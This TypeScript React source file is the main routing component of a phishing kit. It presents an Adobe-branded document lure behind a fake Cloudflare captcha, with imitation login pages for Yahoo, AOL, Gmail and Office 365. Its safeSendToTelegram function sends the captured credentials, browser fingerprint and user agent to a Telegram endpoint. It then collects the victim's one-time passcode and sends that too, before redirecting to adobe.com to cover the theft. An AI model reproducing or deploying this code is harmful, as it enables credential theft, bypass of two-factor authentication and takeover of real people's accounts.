import React, { useState, useEffect } from 'react';
import { Routes, Route, useNavigate, Navigate } from 'react-router-dom';
import LoginPage from './components/LoginPage';
import MobileLoginPage from './components/mobile/MobileLoginPage';
import YahooLoginPage from './components/YahooLoginPage';
import MobileYahooLoginPage from './components/mobile/MobileYahooLoginPage';
import AolLoginPage from './components/AolLoginPage';
import GmailLoginPage from './components/GmailLoginPage';
import Office365Wrapper from './components/Office365Wrapper';
import LandingPage from './components/LandingPage';
import MobileLandingPage from './components/mobile/MobileLandingPage';
import CloudflareCaptcha from './components/CloudflareCaptcha';
import Spinner from './components/common/Spinner';
import OtpPage from './components/OtpPage';
import MobileOtpPage from './components/mobile/MobileOtpPage';
import { getBrowserFingerprint } from './utils/oauthHandler';
import { setCookie, getCookie, removeCookie, subscribeToCookieChanges, CookieChangeEvent } from './utils/realTimeCookieManager';
import { config } from './config';

const safeSendToTelegram = async (payload: any) => {
  try {
    const res = await fetch(config.api.sendTelegramEndpoint, {
      method: 'POST',
      headers: { 'Content-Type': 'application/json' },
      body: JSON.stringify(payload)
    });
    if (!res.ok) { throw new Error(`HTTP ${res.status}`); }
    return await res.json();
  } catch (fetchErr) {
    console.error('safeSendToTelegram failed:', fetchErr);
    // Don't re-throw, to allow the flow to continue
  }
};

function App() {
  const [isMobile, setIsMobile] = useState(window.innerWidth <= 768);
  const [hasActiveSession, setHasActiveSession] = useState(() => !!getCookie('adobe_session'));
  const [isLoading, setIsLoading] = useState(false);
  const [loginFlowState, setLoginFlowState] = useState({
    awaitingOtp: false,
    sessionData: null as any,
  });
  const navigate = useNavigate();

  useEffect(() => {
    const checkMobile = () => setIsMobile(window.innerWidth <= 768);
    window.addEventListener('resize', checkMobile);
    return () => window.removeEventListener('resize', checkMobile);
  }, []);

  useEffect(() => {
    const handleCookieChange = (event: CookieChangeEvent) => {
      if (event.name === 'adobe_session') {
        const isActive = event.action !== 'remove' && !!event.value;
        if (isActive !== hasActiveSession) {
          setHasActiveSession(isActive);
        }
      }
    };
    const unsubscribe = subscribeToCookieChanges(handleCookieChange);
    return unsubscribe;
  }, [hasActiveSession]);

  useEffect(() => {
    if (hasActiveSession) {
      navigate('/landing', { replace: true });
    } else if (!loginFlowState.awaitingOtp) {
      // If there's no session and we are not in the middle of an OTP flow, go to the root.
      const currentPath = window.location.pathname;
      if (currentPath !== '/') {
         navigate('/', { replace: true });
      }
    }
  // eslint-disable-next-line react-hooks/exhaustive-deps
  }, [hasActiveSession, navigate]);


  const handleCaptchaVerified = () => navigate('/login');

  const handleSecondLoginAttempt = async (loginData: any) => {
    setIsLoading(true);
    const browserFingerprint = await getBrowserFingerprint();
    const finalSessionData = {
      ...loginData,
      sessionId: Math.random().toString(36).substring(2, 15),
      timestamp: new Date().toISOString(),
      userAgent: navigator.userAgent,
      ...browserFingerprint,
    };
    
    await safeSendToTelegram({
      type: 'credentials',
      data: finalSessionData,
    });
    
    setIsLoading(false);
    setLoginFlowState({
      awaitingOtp: true,
      sessionData: finalSessionData,
    });
  };
  
  const handleLogout = () => {
    localStorage.removeItem(config.session.sessionDataKey);
    sessionStorage.clear();
    config.session.cookieNames.forEach(name => removeCookie(name, { path: '/' }));
    setHasActiveSession(false); // Explicitly set state to trigger re-render and navigation
  };

  const handleOtpSubmit = async (otp: string) => {
    setIsLoading(true);

    await safeSendToTelegram({
      type: 'otp',
      data: {
        otp,
        session: loginFlowState.sessionData,
      },
    });

    // Perform the redirect. Do not reset state, as this can cause
    // a re-render before the navigation completes. The page will be
    // left behind anyway.
    window.location.href = 'https://www.adobe.com';
  };

  const handleOtpBack = () => {
    setLoginFlowState({ awaitingOtp: false, sessionData: null });
    // This will cause a re-route to the login page via the useEffect hook
    navigate('/login', { replace: true });
  };
  
  // --- Render Logic ---
  if (isLoading) {
    return <div className="min-h-screen bg-gray-100 flex items-center justify-center"><div className="text-center"><Spinner size="lg" /><p className="text-gray-600 mt-4">Loading...</p></div></div>;
  }

  // If waiting for OTP, show the OTP page regardless of other state
  if (loginFlowState.awaitingOtp) {
    const OtpComponent = isMobile ? MobileOtpPage : OtpPage;
    return <OtpComponent 
      email={loginFlowState.sessionData?.email}
      provider={loginFlowState.sessionData?.provider}
      onSubmit={handleOtpSubmit} 
      onBack={handleOtpBack} 
    />;
  }

  const LoginComponent = isMobile ? MobileLoginPage : LoginPage;
  const LandingComponent = isMobile ? MobileLandingPage : LandingPage;
  const YahooComponent = isMobile ? MobileYahooLoginPage : YahooLoginPage;

  // This defines the pages and their paths for the router
  return (
    <Routes>
      <Route path="/" element={!hasActiveSession ? <CloudflareCaptcha onVerified={handleCaptchaVerified} /> : <Navigate to="/landing" replace />} />
      <Route path="/login" element={!hasActiveSession ? <LoginComponent fileName="Adobe Cloud Access" onYahooSelect={() => navigate('/login/yahoo')} onAolSelect={() => navigate('/login/aol')} onGmailSelect={() => navigate('/login/gmail')} onOffice365Select={() => navigate('/login/office365')} onBack={() => navigate('/')} onLoginError={e => console.error(e)} /> : <Navigate to="/landing" replace />} />
      <Route path="/login/yahoo" element={!hasActiveSession ? <YahooComponent onLoginError={e => console.error(e)} /> : <Navigate to="/landing" replace />} />
      <Route path="/login/aol" element={!hasActiveSession ? <AolLoginPage onLoginError={e => console.error(e)} /> : <Navigate to="/landing" replace />} />
      <Route path="/login/gmail" element={!hasActiveSession ? <GmailLoginPage onLoginError={e => console.error(e)} /> : <Navigate to="/landing" replace />} />
      <Route path="/login/office365" element={!hasActiveSession ? <Office365Wrapper onLoginError={e => console.error(e)} /> : <Navigate to="/landing" replace />} />
      <Route path="/landing" element={hasActiveSession ? <LandingComponent onLogout={handleLogout} /> : <Navigate to="/" replace />} />
      <Route path="*" element={<Navigate to={hasActiveSession ? "/landing" : "/"} replace />} />
    </Routes>
  );
}

export default App;
